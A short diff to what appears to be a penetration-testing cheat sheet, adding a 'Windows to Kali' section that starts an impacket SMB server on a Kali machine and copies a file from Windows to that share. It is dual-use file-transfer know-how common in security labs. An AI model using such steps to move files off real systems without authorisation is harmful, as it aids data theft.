@@ -67,3 +67,20 @@ impacket-smbserver share /home/[USERNAME]/Desktop -smb2support
 ```
 
 
+
+
+
+
+
+
+
+
+
+
+### Windows to Kali
+
+```powershell
+kali> impacket-smbserver -smb2support <sharename> .
+win> copy file \\KaliIP\sharename
+```
+
